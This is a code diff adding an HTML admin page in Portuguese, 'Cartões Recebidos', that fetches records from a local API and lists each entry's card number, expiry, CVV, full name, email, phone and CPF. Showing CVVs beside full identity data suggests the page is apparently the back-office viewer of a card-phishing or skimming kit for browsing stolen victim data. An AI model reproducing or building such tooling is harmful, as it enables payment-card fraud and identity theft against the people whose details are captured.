@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Card Check</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        .card-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        
+        .card-item {
+            background: rgba(26, 27, 46, 0.8);
+            border-radius: 10px;
+            padding: 15px;
+            border: 1px solid var(--neon-blue);
+        }
+        
+        .card-item h3 {
+            color: var(--neon-pink);
+            margin-bottom: 10px;
+        }
+        
+        .card-item p {
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+        
+        .card-item .timestamp {
+            color: var(--neon-purple);
+            font-size: 0.8em;
+            margin-top: 10px;
+        }
+        
+        .refresh-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 30px;
+            background: linear-gradient(45deg, var(--neon-pink), var(--neon-purple));
+            border: none;
+            border-radius: 5px;
+            color: var(--text-color);
+            font-family: 'Orbitron', sans-serif;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        
+        .no-cards {
+            text-align: center;
+            padding: 50px;
+            color: var(--text-color);
+            font-size: 1.2em;
+        }
+
+        .error-message {
+            color: var(--neon-pink);
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 5px;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="cyberpunk-border">
+            <h1 class="neon-text">Cartões Recebidos<span class="blink">_</span></h1>
+            <div id="cardList" class="card-list">
+                <div class="no-cards">Carregando cartões...</div>
+            </div>
+        </div>
+    </div>
+    <button class="refresh-button" onclick="loadCards()">Atualizar Lista</button>
+
+    <script>
+        function formatDate(isoString) {
+            const date = new Date(isoString);
+            return date.toLocaleString('pt-BR');
+        }
+
+        function showError(message) {
+            const cardList = document.getElementById('cardList');
+            cardList.innerHTML = `<div class="error-message">${message}</div>`;
+        }
+
+        async function loadCards() {
+            const cardList = document.getElementById('cardList');
+            cardList.innerHTML = '<div class="no-cards">Carregando cartões...</div>';
+            
+            try {
+                const response = await fetch('http://localhost:5000/api/list-cards', {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro na resposta do servidor');
+                }
+                
+                const data = await response.json();
+                
+                if (data.success && data.cards.length > 0) {
+                    cardList.innerHTML = data.cards.map(card => `
+                        <div class="card-item">
+                            <h3>Cartão Recebido</h3>
+                            <p><strong>Número:</strong> ${card.data.cardNumber || 'N/A'}</p>
+                            <p><strong>Nome:</strong> ${card.data.cardName || 'N/A'}</p>
+                            <p><strong>Validade:</strong> ${card.data.expiryDate || 'N/A'}</p>
+                            <p><strong>CVV:</strong> ${card.data.cvv || 'N/A'}</p>
+                            <p><strong>Nome Completo:</strong> ${card.data.fullName || 'N/A'}</p>
+                            <p><strong>Email:</strong> ${card.data.email || 'N/A'}</p>
+                            <p><strong>Telefone:</strong> ${card.data.phone || 'N/A'}</p>
+                            <p><strong>CPF:</strong> ${card.data.cpf || 'N/A'}</p>
+                            <p class="timestamp">Recebido em: ${formatDate(card.data.timestamp)}</p>
+                        </div>
+                    `).join('');
+                } else {
+                    cardList.innerHTML = '<div class="no-cards">Nenhum cartão encontrado</div>';
+                }
+            } catch (error) {
+                showError('Erro ao carregar cartões: ' + error.message);
+            }
+        }
+
+        // Load cards when page loads
+        loadCards();
+    </script>
+</body>
+</html>
